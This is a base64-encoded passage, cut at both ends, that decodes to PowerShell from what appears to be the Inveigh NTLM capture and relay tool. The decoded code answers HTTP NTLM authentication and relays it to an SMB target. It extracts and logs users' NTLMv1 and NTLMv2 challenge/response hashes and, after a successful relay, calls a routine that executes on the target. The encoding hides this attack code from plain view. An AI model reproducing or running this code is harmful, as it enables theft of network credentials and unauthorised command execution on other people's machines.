pZ2guY29uc29sZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHRhcmdldCBpcyBub3QgcmVzcG9uZGluZyIpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSB0YXJnZXQgaXMgbm90IHJlc3BvbmRpbmciKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwIC1lcSAxKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9ieXRlcyA9IFNNQlJlbGF5Q2hhbGxlbmdlICRTTUJfcmVsYXlfc29ja2V0ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMgogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2J5dGVzID0gJFNNQl9yZWxheV9ieXRlc1syLi4kU01CX3JlbGF5X2J5dGVzLmxlbmd0aF0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl91c2VyX0lEID0gJFNNQl9yZWxheV9ieXRlc1szNC4uMzNdCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfTlRMTVNTUCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9yZWxheV9ieXRlcykKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9OVExNU1NQID0gJFNNQl9yZWxheV9OVExNU1NQIC1yZXBsYWNlICItIiwiIgogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X05UTE1TU1BfaW5kZXggPSAkU01CX3JlbGF5X05UTE1TU1AuSW5kZXhPZigiNEU1NDRDNEQ1MzUzNTAwMCIpCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCA9ICRTTUJfcmVsYXlfTlRMTVNTUF9pbmRleCAvIDIKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kb21haW5fbGVuZ3RoID0gRGF0YUxlbmd0aCAoJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgMTIpICRTTUJfcmVsYXlfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kb21haW5fbGVuZ3RoX29mZnNldF9ieXRlcyA9ICRTTUJfcmVsYXlfYnl0ZXNbKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDEyKS4uKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDE5KV0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl90YXJnZXRfbGVuZ3RoID0gRGF0YUxlbmd0aCAoJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgNDApICRTTUJfcmVsYXlfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl90YXJnZXRfbGVuZ3RoX29mZnNldF9ieXRlcyA9ICRTTUJfcmVsYXlfYnl0ZXNbKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDQwKS4uKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDU1ICsgJFNNQl9kb21haW5fbGVuZ3RoKV0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9OVExNX2NoYWxsZW5nZSA9ICRTTUJfcmVsYXlfYnl0ZXNbKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDI0KS4uKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDMxKV0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV90YXJnZXRfZGV0YWlscyA9ICRTTUJfcmVsYXlfYnl0ZXNbKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDU2ICsgJFNNQl9kb21haW5fbGVuZ3RoKS4uKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDU1ICsgJFNNQl9kb21haW5fbGVuZ3RoICsgJFNNQl90YXJnZXRfbGVuZ3RoKV0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgW2J5dGVbXV0gJEhUVFBfTlRMTV9ieXRlcyA9ICgweDRlLDB4NTQsMHg0YywweDRkLDB4NTMsMHg1MywweDUwLDB4MDAsMHgwMiwweDAwLDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfZG9tYWluX2xlbmd0aF9vZmZzZXRfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICArICgweDA1LDB4ODIsMHg4OSwweGEyKWAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9yZWxheV9OVExNX2NoYWxsZW5nZWAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMClgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfdGFyZ2V0X2xlbmd0aF9vZmZzZXRfYnl0ZXNgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICArICRTTUJfcmVsYXlfdGFyZ2V0X2RldGFpbHMKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE1fY2hhbGxlbmdlX2Jhc2U2NCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRIVFRQX05UTE1fYnl0ZXMpCiAgICAgICAgICAgICAgICAgICAgICAgICROVExNID0gJ05UTE0gJyArICROVExNX2NoYWxsZW5nZV9iYXNlNjQKICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE1fY2hhbGxlbmdlID0gU01CTlRMTUNoYWxsZW5nZSAkU01CX3JlbGF5X2J5dGVzCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBfY2hhbGxlbmdlX3F1ZXVlLkFkZCgkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LlBvcnQgKyAnLCcgKyAkTlRMTV9jaGFsbGVuZ2UpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCJSZWNlaXZlZCBjaGFsbGVuZ2UgJE5UTE1fY2hhbGxlbmdlIGZvciByZWxheSBmcm9tICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFJlY2VpdmVkIGNoYWxsZW5nZSAkTlRMTV9jaGFsbGVuZ2UgZm9yIHJlbGF5IGZyb20gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiUHJvdmlkaW5nIGNoYWxsZW5nZSAkTlRMTV9jaGFsbGVuZ2UgZm9yIHJlbGF5IHRvICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFByb3ZpZGluZyBjaGFsbGVuZ2UgJE5UTE1fY2hhbGxlbmdlIGZvciByZWxheSB0byAiICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE0gPSBOVExNQ2hhbGxlbmdlQmFzZTY0CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAkTlRMTSA9IE5UTE1DaGFsbGVuZ2VCYXNlNjQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJGludmVpZ2gucmVzcG9uc2UuU3RhdHVzQ29kZSA9IDQwMQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkSFRUUF9yZXF1ZXN0X2J5dGVzWzhdIC1lcSAzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkTlRMTSA9ICdOVExNJwogICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9vZmZzZXQgPSAkSFRUUF9yZXF1ZXN0X2J5dGVzWzI0XQogICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9sZW5ndGggPSBEYXRhTGVuZ3RoIDIyICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICRIVFRQX05UTE1fZG9tYWluX2xlbmd0aCA9IERhdGFMZW5ndGggMjggJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9kb21haW5fb2Zmc2V0ID0gRGF0YUxlbmd0aCAzMiAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIFtzdHJpbmddJE5UTE1fY2hhbGxlbmdlID0gJGludmVpZ2guSFRUUF9jaGFsbGVuZ2VfcXVldWUgLWxpa2UgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5Qb3J0ICsgJyonCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5IVFRQX2NoYWxsZW5nZV9xdWV1ZS5SZW1vdmUoJE5UTE1fY2hhbGxlbmdlKQogICAgICAgICAgICAgICAgJE5UTE1fY2hhbGxlbmdlID0gJE5UTE1fY2hhbGxlbmdlLlN1YnN0cmluZygoJE5UTE1fY2hhbGxlbmdlLkluZGV4T2YoIiwiKSkrMSkKICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmKCRIVFRQX05UTE1fZG9tYWluX2xlbmd0aCAtZXEgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmcgPSAnJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgeyAgCiAgICAgICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nID0gRGF0YVRvU3RyaW5nICRIVFRQX05UTE1fZG9tYWluX2xlbmd0aCAwIDAgJEhUVFBfTlRMTV9kb21haW5fb2Zmc2V0ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgIH0gCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkSFRUUF9OVExNX3VzZXJfbGVuZ3RoID0gRGF0YUxlbmd0aCAzNiAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAkSFRUUF9OVExNX3VzZXJfc3RyaW5nID0gRGF0YVRvU3RyaW5nICRIVFRQX05UTE1fdXNlcl9sZW5ndGggJEhUVFBfTlRMTV9kb21haW5fbGVuZ3RoIDAgJEhUVFBfTlRMTV9kb21haW5fb2Zmc2V0ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2hvc3RfbGVuZ3RoID0gRGF0YUxlbmd0aCA0NCAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2hvc3Rfc3RyaW5nID0gRGF0YVRvU3RyaW5nICRIVFRQX05UTE1faG9zdF9sZW5ndGggJEhUVFBfTlRMTV9kb21haW5fbGVuZ3RoICRIVFRQX05UTE1fdXNlcl9sZW5ndGggJEhUVFBfTlRMTV9kb21haW5fb2Zmc2V0ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAKICAgICAgICAgICAgICAgIGlmKCRIVFRQX05UTE1fbGVuZ3RoIC1lcSAyNCkgIyBOVExNdjEKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTlRMTV90eXBlID0gIk5UTE12MSIKICAgICAgICAgICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJEhUVFBfcmVxdWVzdF9ieXRlc1soJEhUVFBfTlRMTV9vZmZzZXQgLSAyNCkuLigkSFRUUF9OVExNX29mZnNldCArICRIVFRQX05UTE1fbGVuZ3RoKV0pIC1yZXBsYWNlICItIiwiIgogICAgICAgICAgICAgICAgICAgICROVExNX3Jlc3BvbnNlID0gJE5UTE1fcmVzcG9uc2UuSW5zZXJ0KDQ4LCc6JykKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5IVFRQX05UTE1faGFzaCA9ICRIVFRQX05UTE1fdXNlcl9zdHJpbmcgKyAiOjoiICsgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nICsgIjoiICsgJE5UTE1fcmVzcG9uc2UgKyAiOiIgKyAkTlRMTV9jaGFsbGVuZ2UKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZigoKCROVExNX2NoYWxsZW5nZSAtbmUgJycpIC1hbmQgKCROVExNX3Jlc3BvbnNlIC1uZSAnJykpIC1hbmQgKCgkTWFjaGluZUFjY291bnRzIC1lcSAneScpIC1vciAoKCRNYWNoaW5lQWNjb3VudHMgLWVxICduJykgLWFuZCAoLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykpKSkpCiAgICAgICAgICAgICAgICAgICAgeyAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSBOVExNdjEgY2hhbGxlbmdlL3Jlc3BvbnNlIGZvciAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBjYXB0dXJlZCBmcm9tICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MgKyAiKCIgKyAkSFRUUF9OVExNX2hvc3Rfc3RyaW5nICsgIikiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12MV9maWxlX3F1ZXVlLmFkZCgkaW52ZWlnaC5IVFRQX05UTE1faGFzaCkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYxX2xpc3QuYWRkKCRpbnZlaWdoLkhUVFBfTlRMTV9oYXNoKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIE5UTE12MSBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZWQgZnJvbSAiICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzICsgIigiICsgJEhUVFBfTlRMTV9ob3N0X3N0cmluZyArICIpOmBuIiArICRpbnZlaWdoLkhUVFBfTlRMTV9oYXNoKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCIkSFRUUF90eXBlIE5UTE12MSBjaGFsbGVuZ2UvcmVzcG9uc2Ugd3JpdHRlbiB0byAiICsgJGludmVpZ2guTlRMTXYxX291dF9maWxlKQogICAgICAgICAgICAgICAgICAgICAgICB9ICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiAoKCRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtbm90Y29udGFpbnMgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzKSAtYW5kICgtbm90ICRIVFRQX05UTE1fdXNlcl9zdHJpbmcuRW5kc1dpdGgoJyQnKSkgLWFuZCAoISRpbnZlaWdoLnNwb29mZXJfcmVwZWF0KSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCArPSAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlICMgTlRMTXYyCiAgICAgICAgICAgICAgICB7ICAgCiAgICAgICAgICAgICAgICAgICAgJE5UTE1fdHlwZSA9ICJOVExNdjIiICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJEhUVFBfcmVxdWVzdF9ieXRlc1skSFRUUF9OVExNX29mZnNldC4uKCRIVFRQX05UTE1fb2Zmc2V0ICsgJEhUVFBfTlRMTV9sZW5ndGgpXSkgLXJlcGxhY2UgIi0iLCIiCiAgICAgICAgICAgICAgICAgICAgJE5UTE1fcmVzcG9uc2UgPSAkTlRMTV9yZXNwb25zZS5JbnNlcnQoMzIsJzonKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBfTlRMTV9oYXNoID0gJEhUVFBfTlRMTV91c2VyX3N0cmluZyArICI6OiIgKyAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmcgKyAiOiIgKyAkTlRMTV9jaGFsbGVuZ2UgKyAiOiIgKyAkTlRMTV9yZXNwb25zZQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmKCgoJE5UTE1fY2hhbGxlbmdlIC1uZSAnJykgLWFuZCAoJE5UTE1fcmVzcG9uc2UgLW5lICcnKSkgLWFuZCAoKCRNYWNoaW5lQWNjb3VudHMgLWVxICd5JykgLW9yICgoJE1hY2hpbmVBY2NvdW50cyAtZXEgJ24nKSAtYW5kICgtbm90ICRIVFRQX05UTE1fdXNlcl9zdHJpbmcuRW5kc1dpdGgoJyQnKSkpKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCQoR2V0LURhdGUgLWZvcm1hdCAncycpICsgIiAtICRIVFRQX3R5cGUgTlRMTXYyIGNoYWxsZW5nZS9yZXNwb25zZSBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgY2FwdHVyZWQgZnJvbSAiICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5hZGRyZXNzICsgIigiICsgJEhUVFBfTlRMTV9ob3N0X3N0cmluZyArICIpIildKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZS5hZGQoJGludmVpZ2guSFRUUF9OVExNX2hhc2gpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12Ml9saXN0LmFkZCgkaW52ZWlnaC5IVFRQX05UTE1faGFzaCkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgKyAiIC0gJEhUVFBfdHlwZSBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVkIGZyb20gIiArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuYWRkcmVzcyArICIoIiArICRIVFRQX05UTE1faG9zdF9zdHJpbmcgKyAiKTpgbiIgKyAkaW52ZWlnaC5IVFRQX05UTE1faGFzaCkKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiJEhUVFBfdHlwZSBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIHdyaXR0ZW4gdG8gIiArICRpbnZlaWdoLk5UTE12Ml9vdXRfZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgKCgkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QgLW5vdGNvbnRhaW5zICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcykgLWFuZCAoLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykpIC1hbmQgKCEkaW52ZWlnaC5zcG9vZmVyX3JlcGVhdCkpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QgKz0gJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5yZXNwb25zZS5TdGF0dXNDb2RlID0gMjAwCiAgICAgICAgICAgICAgICAkTlRMTV9jaGFsbGVuZ2UgPSAnJwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiAoKCRpbnZlaWdoLlNNQl9yZWxheSkgLWFuZCAoJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwIC1lcSAzKSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBpZigoISRTTUJSZWxheVVzZXJuYW1lcykgLW9yICgkU01CUmVsYXlVc2VybmFtZXMgLWNvbnRhaW5zICRIVFRQX05UTE1fdXNlcl9zdHJpbmcpIC1vciAoJFNNQlJlbGF5VXNlcm5hbWVzIC1jb250YWlucyAiJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmciKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCgkTWFjaGluZUFjY291bnRzIC1lcSAneScpIC1vciAoKCRNYWNoaW5lQWNjb3VudHMgLWVxICduJykgLWFuZCAoLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykpKSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guU01CUmVsYXlfZmFpbGVkX2xpc3QgLW5vdGNvbnRhaW5zICIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCROVExNX3R5cGUgLWVxICdOVExNdjInKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIlNlbmRpbmcgJE5UTE1fdHlwZSByZXNwb25zZSBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgZm9yIHJlbGF5IHRvICRTTUJSZWxheXRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNlbmRpbmcgJE5UTE1fdHlwZSByZXNwb25zZSBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgZm9yIHJlbGF5IHRvICRTTUJSZWxheXRhcmdldCIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9yZXNwb25zZV9yZXR1cm5fYnl0ZXMgPSBTTUJSZWxheVJlc3BvbnNlICRTTUJfcmVsYXlfc29ja2V0ICRIVFRQX3JlcXVlc3RfYnl0ZXMgJFNNQl91c2VyX0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfcmVzcG9uc2VfcmV0dXJuX2J5dGVzID0gJFNNQl9yZWxheV9yZXNwb25zZV9yZXR1cm5fYnl0ZXNbMS4uJFNNQl9yZWxheV9yZXNwb25zZV9yZXR1cm5fYnl0ZXMubGVuZ3RoXQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigoISRTTUJfcmVsYXlfZmFpbGVkKSAtYW5kIChbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfcmVsYXlfcmVzcG9uc2VfcmV0dXJuX2J5dGVzWzkuLjEyXSkgLWVxICgnMDAtMDAtMDAtMDAnKSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCIkSFRUUF90eXBlIHRvIFNNQiByZWxheSBhdXRoZW50aWNhdGlvbiBzdWNjZXNzZnVsIGZvciAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSB0byBTTUIgcmVsYXkgYXV0aGVudGljYXRpb24gc3VjY2Vzc2Z1bCBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gNAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU01CUmVsYXlFeGVjdXRlICRTTUJfcmVsYXlfc29ja2V0ICRTTUJfdXNlcl9JRCAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCIkSFRUUF90eXBlIHRvIFNNQiByZWxheSBhdXRoZW50aWNhdGlvbiBmYWlsZWQgZm9yICRI